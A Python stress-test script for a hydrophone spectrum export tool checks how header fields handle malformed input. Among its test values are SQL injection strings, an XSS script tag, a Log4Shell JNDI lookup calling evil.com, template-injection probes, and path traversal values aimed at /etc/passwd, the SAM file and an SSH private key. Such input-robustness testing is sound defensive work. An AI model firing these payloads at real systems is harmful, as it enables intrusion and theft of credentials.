#!/usr/bin/env python3
"""
Stress test the export system with all editable fields and problematic text entries
"""

import os
import glob
import tempfile
from export_processor import ExportProcessor

def get_stress_test_scenarios():
    """Return various stress test scenarios with problematic text entries"""
    
    scenarios = [
        {
            'name': 'Basic Valid Test',
            'overrides': {
                'personnel': 'Simon Barr',
                'client': 'ACME Corporation',
                'job': 'JOB-2025-001',
                'start_date': '2025-05-22',
                'timezone': 'Australia/Perth'
            }
        },
        {
            'name': 'Special Characters Test',
            'overrides': {
                'personnel': 'José María Gutiérrez-Sánchez',
                'client': 'Société Française d\'Acoustique',
                'job': 'PROJECT-2025/MAY*SPECIAL',
                'start_date': '2025-05-22',
                'timezone': 'Europe/Paris'
            }
        },
        {
            'name': 'TAB and Newline Injection Test',
            'overrides': {
                'personnel': 'John\tDoe\nHacker',
                'client': 'Company\twith\ttabs',
                'job': 'Job\nwith\nnewlines',
                'start_date': '2025-05-22',
                'timezone': 'UTC'
            }
        },
        {
            'name': 'Very Long Text Test',
            'overrides': {
                'personnel': 'Dr. Alexandra Katherine Elizabeth Pemberton-Worthington-Smythe III, PhD, MSc, BSc, FRSA, FRAS, FICS',
                'client': 'The International Consortium for Advanced Marine Acoustic Research and Environmental Monitoring Technologies Corporation Ltd.',
                'job': 'ULTRA-LONG-PROJECT-NAME-WITH-MANY-HYPHENS-AND-DESCRIPTIVE-ELEMENTS-2025-SPRING-DEPLOYMENT-PHASE-1A',
                'start_date': '2025-05-22',
                'timezone': 'Pacific/Auckland'
            }
        },
        {
            'name': 'Empty Fields Test',
            'overrides': {
                'personnel': '',
                'client': '',
                'job': '',
                'start_date': '',
                'timezone': 'UTC'
            }
        },
        {
            'name': 'Whitespace Only Test',
            'overrides': {
                'personnel': '   ',
                'client': '\t\t\t',
                'job': '   \n   ',
                'start_date': '2025-05-22',
                'timezone': 'UTC'
            }
        },
        {
            'name': 'SQL Injection Attempt',
            'overrides': {
                'personnel': "'; DROP TABLE users; --",
                'client': "Robert'); DELETE FROM clients WHERE id=1; --",
                'job': "1' OR '1'='1",
                'start_date': '2025-05-22',
                'timezone': 'UTC'
            }
        },
        {
            'name': 'Script Injection Attempt',
            'overrides': {
                'personnel': '<script>alert("XSS")</script>',
                'client': '${jndi:ldap://evil.com/exploit}',
                'job': '{{7*7}}[[7*7]]',
                'start_date': '2025-05-22',
                'timezone': 'UTC'
            }
        },
        {
            'name': 'Path Traversal Attempt',
            'overrides': {
                'personnel': '../../../etc/passwd',
                'client': '..\\..\\windows\\system32\\config\\sam',
                'job': '../../../../root/.ssh/id_rsa',
                'start_date': '2025-05-22',
                'timezone': 'UTC'
            }
        },
        {
            'name': 'Unicode and Emoji Test',
            'overrides': {
                'personnel': 'Dr. 🌊 Marine McWaveface 🐋',
                'client': '海洋音響研究所',
                'job': 'Проект-2025-Ѓ',
                'start_date': '2025-05-22',
                'timezone': 'Asia/Tokyo'
            }
        },
        {
            'name': 'Control Characters Test',
            'overrides': {
                'personnel': 'John\x00\x01\x02Doe',
                'client': 'Company\x0b\x0c\x0d',
                'job': 'Job\x1f\x7fTest',
                'start_date': '2025-05-22',
                'timezone': 'UTC'
            }
        },
        {
            'name': 'Extreme Numbers Test',
            'overrides': {
                'personnel': '999999999999999999999999999999',
                'client': '-999999999999999999999999999999',
                'job': '1.7976931348623157e+308',
                'start_date': '9999-12-31',
                'timezone': 'UTC'
            }
        },
        {
            'name': 'Invalid Date Test',
            'overrides': {
                'personnel': 'John Doe',
                'client': 'ACME Corp',
                'job': 'Valid Job',
                'start_date': '2025-13-45',  # Invalid date
                'timezone': 'UTC'
            }
        },
        {
            'name': 'Invalid Timezone Test',
            'overrides': {
                'personnel': 'John Doe',
                'client': 'ACME Corp',
                'job': 'Valid Job',
                'start_date': '2025-05-22',
                'timezone': 'Fake/Timezone'  # Invalid timezone
            }
        }
    ]
    
    return scenarios

def test_scenario(scenario, source_files, test_num):
    """Test a single scenario"""
    
    print(f"\n{'='*60}")
    print(f"TEST #{test_num}: {scenario['name']}")
    print(f"{'='*60}")
    
    # Show what we're testing
    print("Field overrides:")
    for field, value in scenario['overrides'].items():
        display_value = repr(value) if any(c in value for c in ['\t', '\n', '\x00']) else value
        print(f"  {field}: {display_value}")
    
    # Create temporary output file
    with tempfile.NamedTemporaryFile(mode='w', suffix='.txt', delete=False) as f:
        output_file = f.name
    
    try:
        processor = ExportProcessor()
        
        # Test single export
        options = {
            'header_overrides': scenario['overrides'],
            'include_headers': True,
            'merge_timestamps': False
        }
        
        print(f"\n📝 Testing single export...")
        processor.export_files([source_files[0]], output_file, options)
        
        # Read and analyze the output
        with open(output_file, 'r', encoding='utf-8', errors='replace') as f:
            content = f.read()
        
        # Check if file was created and has content
        file_size = len(content)
        lines = content.split('\n')
        header_lines = [line for line in lines if line.strip().startswith('#')]
        data_lines = [line for line in lines if line.strip() and not line.strip().startswith('#')]
        
        print(f"✅ File created: {file_size} characters")
        print(f"✅ Header lines: {len(header_lines)}")
        print(f"✅ Data lines: {len(data_lines)}")
        
        # Check for field preservation
        fields_found = {}
        for field, value in scenario['overrides'].items():
            if field == 'personnel':
                field_found = f"Personnel\t{value}" in content or f"Personnel    {value}" in content
            elif field == 'client':
                field_found = f"Client\t{value}" in content or f"Client    {value}" in content
            elif field == 'job':
                field_found = f"Job\t{value}" in content or f"Job    {value}" in content
            elif field == 'start_date':
                field_found = f"Start Date\t{value}" in content or f"Start Date    {value}" in content
            elif field == 'timezone':
                field_found = f"Time Zone\t{value}" in content or f"Time Zone    {value}" in content
            else:
                field_found = str(value) in content
            
            fields_found[field] = field_found
            status = "✅" if field_found else "❌"
            print(f"  {status} {field}: {'Found' if field_found else 'Missing'}")
        
        # Test multi export with same scenario
        print(f"\n📝 Testing multi export...")
        
        multi_output = output_file + "_multi"
        options['merge_timestamps'] = True
        
        processor.export_files(source_files[:2], multi_output, options)
        
        with open(multi_output, 'r', encoding='utf-8', errors='replace') as f:
            multi_content = f.read()
        
        multi_lines = multi_content.split('\n')
        multi_data_lines = [line for line in multi_lines if line.strip() and not line.strip().startswith('#')]
        
        print(f"✅ Multi-file created: {len(multi_content)} characters")
        print(f"✅ Multi data lines: {len(multi_data_lines)}")
        
        # Check for critical system preservation
        critical_preserved = all([
            'icListen HF' in content,  # Device preserved
            '64000' in content,        # Sample rate preserved
            'Spectrum' in content      # File type preserved
        ])
        
        success = (
            file_size > 1000 and           # File has substantial content
            len(data_lines) > 100 and      # Has actual data
            critical_preserved and         # Critical fields preserved
            len(multi_data_lines) > len(data_lines)  # Multi has more data
        )
        
        print(f"\n🎯 Critical system data preserved: {'✅' if critical_preserved else '❌'}")
        print(f"🎯 Overall test result: {'✅ PASS' if success else '❌ FAIL'}")
        
        # Clean up
        try:
            os.unlink(multi_output)
        except:
            pass
        
        return success, fields_found
        
    except Exception as e:
        print(f"❌ EXCEPTION: {type(e).__name__}: {e}")
        return False, {}
    
    finally:
        try:
            os.unlink(output_file)
        except:
            pass

def main():
    print("🧪 COMPREHENSIVE EXPORT STRESS TEST")
    print("Testing all editable fields with problematic text entries...")
    print("=" * 80)
    
    # Get source files
    source_dir = "/home/ntrevean/ClaudeHydro/Hydrophone Claude Code/sabic fat/Source data"
    spectrum_files = glob.glob(os.path.join(source_dir, "wavtS_*.txt"))
    
    if len(spectrum_files) < 2:
        print(f"❌ Need at least 2 source files, found {len(spectrum_files)}")
        return 1
    
    print(f"📁 Using source files: {len(spectrum_files)} files")
    for f in spectrum_files[:3]:
        print(f"  - {os.path.basename(f)}")
    
    # Run all stress test scenarios
    scenarios = get_stress_test_scenarios()
    results = []
    
    for i, scenario in enumerate(scenarios, 1):
        success, fields_found = test_scenario(scenario, spectrum_files, i)
        results.append({
            'name': scenario['name'],
            'success': success,
            'fields_found': fields_found
        })
    
    # Summary
    print(f"\n{'='*80}")
    print("STRESS TEST SUMMARY")
    print(f"{'='*80}")
    
    passed = sum(1 for r in results if r['success'])
    total = len(results)
    
    print(f"Tests passed: {passed}/{total}")
    print()
    
    for i, result in enumerate(results, 1):
        status = "✅ PASS" if result['success'] else "❌ FAIL"
        print(f"{i:2d}. {result['name']:<35} {status}")
    
    # Detailed field analysis
    print(f"\n{'='*80}")
    print("FIELD PRESERVATION ANALYSIS")
    print(f"{'='*80}")
    
    field_stats = {}
    for result in results:
        for field, found in result['fields_found'].items():
            if field not in field_stats:
                field_stats[field] = {'found': 0, 'total': 0}
            field_stats[field]['total'] += 1
            if found:
                field_stats[field]['found'] += 1
    
    for field, stats in field_stats.items():
        rate = (stats['found'] / stats['total']) * 100 if stats['total'] > 0 else 0
        print(f"{field:<15}: {stats['found']:2d}/{stats['total']:2d} ({rate:5.1f}%)")
    
    print(f"\n{'='*80}")
    if passed == total:
        print("🎉 ALL STRESS TESTS PASSED!")
        print("   - System handles all problematic inputs correctly")
        print("   - All editable fields work as expected")
        print("   - Critical system data always preserved")
        print("   - No crashes or data corruption detected")
    elif passed >= total * 0.8:
        print("🟡 MOSTLY SUCCESSFUL")
        print(f"   - {passed}/{total} tests passed ({(passed/total)*100:.1f}%)")
        print("   - System is robust against most problematic inputs")
    else:
        print("❌ MULTIPLE FAILURES DETECTED")
        print(f"   - Only {passed}/{total} tests passed ({(passed/total)*100:.1f}%)")
        print("   - System may need additional hardening")
    
    return 0 if passed >= total * 0.8 else 1

if __name__ == "__main__":
    exit(main())